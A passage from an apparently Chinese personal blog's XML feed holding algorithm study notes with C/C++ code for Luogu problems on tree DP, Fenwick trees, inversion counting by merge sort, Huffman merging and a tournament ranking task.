&#125;</span><br><span class="line">    <span class="keyword">int</span> root = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(isfather[root])</span><br><span class="line">        root = isfather[root];</span><br><span class="line">    dfs(root);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> node)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(flag[node])</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    flag[node] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span>(lists[node].num==<span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    arc *p = lists[node].head;</span><br><span class="line">    <span class="keyword">while</span>(p)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!flag[p-&gt;data])</span><br><span class="line">        &#123;</span><br><span class="line">            dfs(p-&gt;data);</span><br><span class="line">            dp[node] = max(dp[node], dp[node] + dp[p-&gt;data]);</span><br><span class="line">            ans = max(dp[node], ans);</span><br><span class="line">        &#125;</span><br><span class="line">        p = p-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="洛谷P2015"><a href="#洛谷P2015" class="headerlink" title="洛谷P2015"></a>洛谷P2015</h2><h3 id="题目大意-2"><a href="#题目大意-2" class="headerlink" title="题目大意"></a>题目大意</h3><p><img src="https://raw.githubusercontent.com/ysjyx7/images/master/img/image-20211004132229392.png" alt="image-20211004132229392"></p>
<h3 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h3><p>​    这道题或许更能展现出树形dp的板子，树形dp和之前的dp不一样之处就在于他要依托于树形结构进行dp，树形结构，最常用并且高效简单的一种方法就是链式前向星存图方法，然后要熟练掌握理解依托于链式前向星存图方法的搜索算法。</p>
<p>​    建好图之后，其实就是对整个树进行状态转移，就此题而言，差别就在于是否加入当前边，或者说对当前边进行长度枚举，找到最大值</p>
<h3 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> max(a,b) ((a)&gt;(b)?(a):(b))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> min(a,b) ((a)&lt;(b)?(a):(b))</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">edge</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> next, to, w;</span><br><span class="line">&#125; edge;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">edge</span> <span class="title">edges</span>[202];</span></span><br><span class="line"><span class="keyword">int</span> head[<span class="number">101</span>];</span><br><span class="line"><span class="keyword">int</span> num,n,m;</span><br><span class="line"><span class="keyword">int</span> dp[<span class="number">101</span>][<span class="number">101</span>],size[<span class="number">101</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> v,<span class="keyword">int</span> w)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    edges[num].w = w;</span><br><span class="line">    edges[num].to = v;</span><br><span class="line">    edges[num].next = head[u];</span><br><span class="line">    head[u] = num++;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u, <span class="keyword">int</span> father)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">memset</span>(head, <span class="number">-1</span>, <span class="keyword">sizeof</span>(head));</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> u, v, w;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;u, &amp;v, &amp;w);</span><br><span class="line">        add(u, v, w);</span><br><span class="line">        add(v, u, w);</span><br><span class="line">    &#125;</span><br><span class="line">    dfs(<span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>, dp[<span class="number">1</span>][m]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> u,<span class="keyword">int</span> father)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = head[u]; i != <span class="number">-1</span>;i=edges[i].next)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> v = edges[i].to;</span><br><span class="line">        <span class="keyword">if</span>(v==father)</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        dfs(v, u);</span><br><span class="line">        size[u] += size[v] + <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> j = min(m, size[u]); j;j--)<span class="comment">//dp[u][j]表示以u为起点的j条边具有的最优值</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> k = min(j - <span class="number">1</span>, size[v]); k&gt;=<span class="number">0</span>;k--)<span class="comment">//k就是用来加入断点的</span></span><br><span class="line">            &#123;</span><br><span class="line">                dp[u][j] = max(dp[u][j], dp[u][j - k - <span class="number">1</span>] + dp[v][k] + edges[i].w);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>算法</category>
        <category>动态规划</category>
      </categories>
      <tags>
        <tag>算法</tag>
        <tag>动态规划</tag>
      </tags>
  </entry>
  <entry>
    <title>树状数组</title>
    <url>/2022/02/23/%E6%A0%91%E7%8A%B6%E6%95%B0%E7%BB%84/</url>
    <content><![CDATA[<h1>背景</h1>
<p>​	一般对于数组而言，我们可能会经常进行单点修改和求某个区间和的操作，如果不做任何处理，那显然前者时间复杂度为$O(1)$，后者为$O(n)$，而如果用前缀和进行维护，后者时间复杂度就变成了$O(1)$，但是在单点修改的时候，由于要对前缀和数组进行维护，时间复杂度就变成了$O(n)$。</p>
<p>​	树状数组是一种折衷的方案，在大多数情况下可以让这两种操作的时间复杂度达到$log(n)$</p>
<h1>主要思路</h1>
<p>​	事实上在求数组的区间和的时候，可以考虑用另外一个数组去维护一系列小区间，然后将这些小区间组合成想要的大区间即可得到区间和。当然这样做显然是需要一种很好的思路的。</p>
<p>​	树状数组利用二进制来进行维护。我们以11为例，11的二进制数是1011，那么就可以通过如下方式求前11项的和，即</p>
<p>$((0000)_2,(1000)_2]+((1000)_2,(1010)_2]+((1010)_2,(1011)_2]$</p>
<p>​	关于上面的三个区间的得到，其实是每次都去掉二进制数最右边那个1的一个循环过程。</p>
<p>​	我们定义二进制数最右边的1连带着后面的0为$lowbit(x)$，然后考虑用$C_i$去维护区间$(A_i-lowbit(A_i),A_i]$，显然根据二进制的性质，最终合并的区间数是要小于$log_2n$的。</p>
<p>​	之所以叫树状数组，是因为它每次更新的时候，就像是一个爬树的过程，具体的树形结构如下：</p>
<p><img src="https://cdn.jsdelivr.net/gh/ysjyx7/img@main/image-20220326171038392.png" alt="image-20220326171038392"></p>
<p>​	比如以一个二进制数$(100110)_2$为例，更改了这个下标对应的值，需要对应更改包围这个值的对应区间值，从最小的开始找，首先是$((100100)_2,(100110)_2]$，然后是$((100110)_2,(101000)_2]$，然后依次向上找。</p>
<p>​	这个过程实际上就是，<strong>每一步从右边起，把连续的1都变成0，然后把左边的一个0变成1</strong>，实质上，这里面每一步都加了一个$lowbit(x)$</p>
<h1>代码实现</h1>
<p>​	目前来看最重要的函数应该是$lowbit(x)$。先回顾一下，这个函数的作用是求出x的二进制数中最靠右的1及其右边的0的这样一个值。显然如果按照正常的思路进行演算的时候会产生额外的时间开销，但是事实上我们有一个更加精妙的计算方法，即<strong>lowbit(x)=x&amp;(-x)</strong>。</p>
<p>​	这个方法的利用了补码的特点，即按位取反再加一，比如1000…，求负后得到的还是1000…，而这个1前面的每一位都对应相反，因此再进行按位与即可。</p>
<p>​	接下来就可以使用这个函数来进行相应的操作了</p>
<h2 id="单点修改"><a class="header-anchor" href="#单点修改">¶</a>单点修改</h2>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> tree[MAXN];</span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">void</span> <span class="title">update</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> pos=i;pos&lt;MAXN;pos+=<span class="built_in">lowbit</span>(pos))</span><br><span class="line">		tree[pos]+=x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="求前n-项和"><a class="header-anchor" href="#求前n-项和">¶</a>求前n 项和</h2>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">query</span><span class="params">(<span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> pos=n;pos;pos-=<span class="built_in">lowbit</span>(pos))</span><br><span class="line">		ans+=tree[pos];</span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="区间查询"><a class="header-anchor" href="#区间查询">¶</a>区间查询</h2>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">quer</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="built_in">query</span>(b)-<span class="built_in">query</span>(a<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构</category>
        <category>特殊数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>特殊数据结构</tag>
      </tags>
  </entry>
  <entry>
    <title>洛谷P1908，求逆序对</title>
    <url>/2021/08/15/%E6%B1%82%E9%80%86%E5%BA%8F%E5%AF%B9/</url>
    <content><![CDATA[<h1 id="题目概述"><a href="#题目概述" class="headerlink" title="题目概述"></a>题目概述</h1><p>​    给出一列数，共有$n$个，逆序对指的是满足$i&gt;j$并且$a_i&lt;a_j$的数对，求数对的数量</p>
<h1 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h1><h2 id="思路一：归并排序"><a href="#思路一：归并排序" class="headerlink" title="思路一：归并排序"></a>思路一：归并排序</h2><p>​    归并排序的思路就是每次折半分，然后再有一个匹配的过程，然后在匹配之前，左右两部分都已经基本有序，这时候就按照归并排序中匹配的步骤，只是加入了计算逆序对数量的一步，下面给出一个具体的例子，这里复制了洛谷题解中<strong>学无止境</strong>大佬的例子</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//在某个时候，左区间：  5 6 7  下标为i</span></span><br><span class="line"><span class="comment">//           右区间：  1 2 9  下标为j</span></span><br><span class="line"><span class="comment">//          </span></span><br><span class="line"><span class="comment">//这个时候我们进行合并：</span></span><br><span class="line"><span class="comment">//step 1：由于 5&gt;1，所以产生了逆序对，这里，我们发现，左区间所有还没有被合并的数都比 1 大，所以1与左区间所有元素共产生了 3 个逆序对(即tot_numleft-i+1对)，统计答案并合并 1 </span></span><br><span class="line"><span class="comment">//step 2：由于 5&gt;2，由上产生了3对逆序对，统计答案并合并 2</span></span><br><span class="line"><span class="comment">//step 3：由于 5&lt;9, 没有逆序对产生，右区间下标 j++</span></span><br><span class="line"><span class="comment">//step 4：由于 6&lt;9, 没有逆序对产生，右区间下标 j++</span></span><br><span class="line"><span class="comment">//step 5：由于 7&lt;9, 没有逆序对产生，右区间下标 j++</span></span><br><span class="line"><span class="comment">//step 6：由于右区间已经结束，正常执行合并左区间剩余，结束</span></span><br><span class="line"><span class="comment">//PS： tot_numleft=3，即左区间总元素个数</span></span><br></pre></td></tr></table></figure>
<h2 id="思路二：-树状数组"><a href="#思路二：-树状数组" class="headerlink" title="思路二： 树状数组"></a>思路二： 树状数组</h2><h3 id="树状数组"><a href="#树状数组" class="headerlink" title="树状数组"></a>树状数组</h3><ol>
<li><p>先来简单介绍一下树状数组，下面这张图摘自微信公众号<strong>夜深人静写算法</strong>，讲的非常清晰<img src="/images/树状数组.jpg" alt="树状数组1"></p>
<p>  其父子关系满足$(y,x):x+lowbit(x)=y$</p>
<p>  其中数组$A$​表示原数组，数组$C$​表示树状数组，树状数组本身的目的就是让求一段元素的区间和变快，这里数组C的值等于其对应的所有孩子的数据的和，这里可以理解成后缀和</p>
<p>  则C数组的值为</p>
<p><img src="/images/树状数组2.jpg" alt="树状数组2"></p>
</li>
<li><p>然后是树状数组的两种基本操作，即求和和更新</p>
<p><strong>求和</strong></p>
<p>其实求和的思想很简单，用$lowbit(i)$函数表示i的二进制表示的末位是1的位数，由树状数组的定义容易推出递推式，即$sum(i)=sum(i-lowbit(i))+C_i$，现在为了减少空间开销，可以采用递推</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sum</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;	</span><br><span class="line">	<span class="keyword">int</span> s=<span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(i&gt;=<span class="number">1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		s+=c[i];</span><br><span class="line">		i-=lowbit(i);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>更新</strong></p>
<p>更新的话主要是更新树状数组，由于父子关系，可以从叶子节点逐步向上更新</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="keyword">int</span> maxn=<span class="number">100000</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> i,<span class="keyword">int</span> v)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">while</span>(i&lt;=maxn)</span><br><span class="line">	&#123;</span><br><span class="line">		c[i]+=v;</span><br><span class="line">		i+=lowbit(i)</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>lowbit(int i)</strong></p>
<p>最后说一下lowbit函数的实现方法，首先比较常见且简单地就是利用补码，补码可以这样求：写出二进制，从右往左找到第一个1，1右边的不变，左边的依次取反即可，也就是可以这样写</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x&amp;-x;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>另外一种方法不重要，这里给出代码</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">lowbit</span><span class="params">(<span class="keyword">int</span> i)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> x-x&amp;(x<span class="number">-1</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><h2 id="归并排序："><a href="#归并排序：" class="headerlink" title="归并排序："></a>归并排序：</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="keyword">int</span> a[<span class="number">500001</span>],tmp[<span class="number">500001</span>];</span><br><span class="line"><span class="keyword">long</span> <span class="keyword">long</span> ans;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergesort</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    mergesort(<span class="number">1</span>, n);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergesort</span><span class="params">(<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(left==right)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">    mergesort(left, mid);</span><br><span class="line">    mergesort(mid+<span class="number">1</span>, right);</span><br><span class="line">    merge(left, right);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> left, <span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>,i=left,mid=(left+right)/<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> j = mid + <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid&amp;&amp;j&lt;=right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;=a[j])</span><br><span class="line">            tmp[k++] = a[i++];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            ans += mid - i + <span class="number">1</span>;</span><br><span class="line">            tmp[k++] = a[j++];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid)</span><br><span class="line">        tmp[k++] = a[i++];</span><br><span class="line">    <span class="keyword">while</span>(j&lt;=right)</span><br><span class="line">        tmp[k++] = a[j++];</span><br><span class="line">    <span class="keyword">for</span> (k = <span class="number">0</span>, i = left; i &lt;= right;i++,k++)</span><br><span class="line">        a[i] = tmp[k];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>数据结构</category>
        <category>算法</category>
        <category>特殊数据结构</category>
        <category>排序算法</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>洛谷P1090 哈夫曼树</title>
    <url>/2021/08/15/%E6%B4%9B%E8%B0%B7P1090/</url>
    <content><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>​    一堆果子，每次合并两个，需要一定的体力，最后到一个停止，让消耗的体力最大</p>
<h1 id="主要思想"><a href="#主要思想" class="headerlink" title="主要思想"></a>主要思想</h1><p>​    这很明显就是哈夫曼树，也就是每次找到两个最小的，然后重复$n$次即可。</p>
<p>​    另外就是使用优先队列</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><h2 id="哈夫曼树的思路"><a href="#哈夫曼树的思路" class="headerlink" title="哈夫曼树的思路"></a>哈夫曼树的思路</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 99999999</span></span><br><span class="line"><span class="comment">//long long ans;</span></span><br><span class="line"><span class="keyword">int</span> n, a[<span class="number">10001</span>];</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">()</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> <span class="keyword">long</span> ans=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n - <span class="number">1</span>;i++)</span><br><span class="line">        ans += find();</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lld&quot;</span>, ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">find</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> min1 = maxn, min2 = maxn;</span><br><span class="line">    <span class="keyword">int</span> mark1 = <span class="number">1</span>, mark2 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">    <span class="keyword">if</span>(a[i]!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;min1)</span><br><span class="line">        &#123;</span><br><span class="line">            min1 = a[i];</span><br><span class="line">            mark1 = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    a[mark1] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n;i++)</span><br><span class="line">    <span class="keyword">if</span>(a[i]!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(a[i]&lt;min2)</span><br><span class="line">        &#123;</span><br><span class="line">            min2 = a[i];</span><br><span class="line">            mark2 = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    a[mark1] = min1 + a[mark2];</span><br><span class="line">    a[mark2] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">return</span> a[mark1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="反思"><a href="#反思" class="headerlink" title="反思"></a>反思</h1><ol>
<li>对于代码调试，要熟练进行文件读写操作</li>
<li>对于在序列中选取第k小的数的方法，要熟悉</li>
</ol>
]]></content>
      <categories>
        <category>数据结构</category>
        <category>二叉树</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>算法</tag>
        <tag>二叉树</tag>
      </tags>
  </entry>
  <entry>
    <title>洛谷P1309 排序算法</title>
    <url>/2021/08/15/%E6%B4%9B%E8%B0%B7P1309/</url>
    <content><![CDATA[<h1 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h1><h2 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h2><p>$2×N$ 名编号为 $1∼2N$ 的选手共进行R 轮比赛。每轮比赛开始前，以及所有比赛结束后，都会按照总分从高到低对选手进行一次排名。选手的总分为第一轮开始前的初始分数加上已参加过的所有比赛的得分和。总分相同的，约定编号较小的选手排名靠前。</p>
<p>每轮比赛的对阵安排与该轮比赛开始前的排名有关：第1名和第2名、第3名和第4名、……、第2<em>K</em>−1名和第2<em>K</em>名、…… 、第2<em>N</em>−1名和第2<em>N</em>名，各进行一场比赛。每场比赛胜者得1分，负者得0分。也就是说除了首轮以外，其它轮比赛的安排均不能事先确定，而是要取决于选手在之前比赛中的表现。</p>
<p>现给定每个选手的初始分数及其实力值，试计算在R 轮比赛过后，排名第<em>Q</em> 的选手编号是多少。我们假设选手的实力值两两不同，且每场比赛中实力值较高的总能获胜。</p>
<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>第一行是三个正整数N,R ,Q每两个数之间用一个空格隔开，表示有 2×<em>N</em>名选手、R轮比赛，以及我们关心的名次Q。</p>
<p>第二行是2×<em>N</em>个非负整数$s_1, s_2, …, s_{2N}$，每两个数之间用一个空格隔开，其中$s_i$表示编号为i的选手的初始分数。 第三行是2×<em>N</em> 个正整数$w_1 , w_2 , …, w_{2N}$，每两个数之间用一个空格隔开，其中$w_i$表示编号为i的选手的实力值。</p>
<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>一个整数，即R<em>R</em> 轮比赛结束后，排名第Q<em>Q</em> 的选手的编号。</p>
<h1 id="思路分析"><a href="#思路分析" class="headerlink" title="思路分析"></a>思路分析</h1><p>​    看到该题的首先想法是按照模拟的思路来，用结构体存储，但是问题在于即使利用快排，他的时间效率也非常低，因为在第一次排过之后，序列就基本有序了，这个时候快速排序的效率就会变得很差，事实上，由于得分的性质，导致胜者是有序的，败者是有序的，所以就考虑分别存储，然后将其归并起来，时间效率就大大提高了，最开始那次采用快速排序，但是程序中有bug，所以最后采用了归并排序</p>
<h1 id="代码如下"><a href="#代码如下" class="headerlink" title="代码如下"></a>代码如下</h1><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="keyword">int</span> power;</span><br><span class="line">    <span class="keyword">int</span> scores;</span><br><span class="line">    <span class="keyword">int</span> id;</span><br><span class="line">&#125;comp;</span><br><span class="line">comp comps[<span class="number">200020</span>],com,win[<span class="number">100010</span>],lose[<span class="number">100010</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">merge</span><span class="params">(<span class="keyword">int</span> n)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">cmp</span><span class="params">(comp a, comp b)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mergesort</span><span class="params">(<span class="keyword">int</span> left,<span class="keyword">int</span> right)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(left==right)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    <span class="keyword">int</span> mid = (left + right) / <span class="number">2</span>;</span><br><span class="line">    mergesort(left, mid);</span><br><span class="line">    mergesort(mid + <span class="number">1</span>, right);</span><br><span class="line">    <span class="keyword">int</span> i = left, j = mid + <span class="number">1</span>, p = left;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid&amp;&amp;j&lt;=right)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(cmp(comps[i],comps[j]))</span><br><span class="line">            lose[p++] = comps[i++];</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            lose[p++] = comps[j++];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span>(i&lt;=mid)</span><br><span class="line">        lose[p++] = comps[i++];</span><br><span class="line">    <span class="keyword">while</span>(j&lt;=right)</span><br><span class="line">        lose[p++] = comps[j++];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> k = left; k &lt;= right;k++)</span><br><span class="line">        comps[k] = lose[k];</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n, r, q,k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d%d%d&quot;</span>, &amp;n, &amp;r, &amp;q);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">2</span>*n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;comps[i].scores);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= <span class="number">2</span>*n;i++)</span><br><span class="line">        <span class="built_in">scanf</span>(<span 